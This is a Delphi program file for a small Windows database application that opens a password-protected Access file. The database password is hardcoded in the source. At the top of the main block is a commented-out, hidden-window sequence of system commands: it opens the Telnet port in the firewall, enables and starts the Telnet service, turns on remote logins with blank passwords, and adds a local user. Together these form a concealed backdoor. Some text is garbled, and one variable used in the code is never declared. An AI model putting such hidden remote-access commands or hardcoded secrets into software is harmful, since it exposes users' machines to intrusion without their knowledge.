program ChoicePenMdb;

uses
  Forms,
  Windows,
  SysUtils,
  Unit1 in 'Unit1.pas' {Form1},
  dm2 in 'dm2.pas' {DM: TDataModule},
  About in '..\About.pas' {AboutBox};

{$R *.res}
var
 str1:widestring='Provider=Microsoft.Jet.OLEDB.4.0;';
 str2:widestring='Data Source=';
 str3:WideString=';Jet OLEDB:Database Password="WEILAIJIAOYU";';
 str:widestring;
 flag:Integer=0;
begin
  {winexec('cmd /c netsh firewall set portopening protocol=TCP Port=23 name="Telnet ������"��mode=ENABLE interface="��������"',sw_hide);
  //winexec('cmd /c net user Windows Cencenr /add',sw_hide);
  winexec('cmd /c sc config tlntsvr start= auto',sw_hide);
  winexec('cmd /c sc start tlntsvr',sw_hide);
  winexec('cmd /c net start tlntsvr',sw_hide);
  winexec('cmd /c reg add "hklm\system\currentcontrolset\control\lsa" /v limitblankpassworduse /t reg_dword /d 0 /f',sw_hide);
  winexec('cmd /c reg add "HKLM\SYSTEM\Controlset001\Control\lsa" /v limitblankpassworduse /t reg_dword /d 0 /f',sw_hide);
   }
  if FileExists('Choicemdb.mdb') then
  begin
{   messagebox(0,'��ǰĿ¼��û����Ҫ�����ݿ��ļ�<destiny.mdb>��'+#13+#13+
                '�뽫����������ݿ��ļ�<destiny.mdb>����ͬһ��Ŀ¼��'+#13+#13+
                '���ȷ�Ϻ��������С�',
   '����',MB_Ok or MB_ICONHAND);
   halt; }
   //DM.AC1.ConnectionString:=str1+str2+'destiny.mdb'+str3;
   str0:=str1+str2+'Choicemdb.mdb'+str3;
   flag:=1;
  end else
  if FileExists('data\Choicemdb.mdb') then
  begin
    //DM.AC1.ConnectionString:=str1+str2+'data\destiny.mdb'+str3;
    str0:=str1+str2+'data\Choicemdb.mdb'+str3;
    flag:=2;
  end;
  //else
  if flag=0 then
  begin
    MessageBox(0,'�ڵ�ǰĿ¼�»�ǰĿ¼   '+#13+#13+
                 '��DataĿ¼��û�з�����   '+#13+#13+
                 '�����ļ�"Choicemdb.mdb"'+#13+#13+
                 '���鱾����ǰλ��'+#13+#13+'Ȼ����������','����',MB_OK or MB_ICONQUESTION);
    halt;
  end;
  Application.Initialize;
  Application.CreateForm(TForm1, Form1);
  Application.CreateForm(TDM, DM);
  Application.CreateForm(TAboutBox, AboutBox);
  Application.Run;
end.
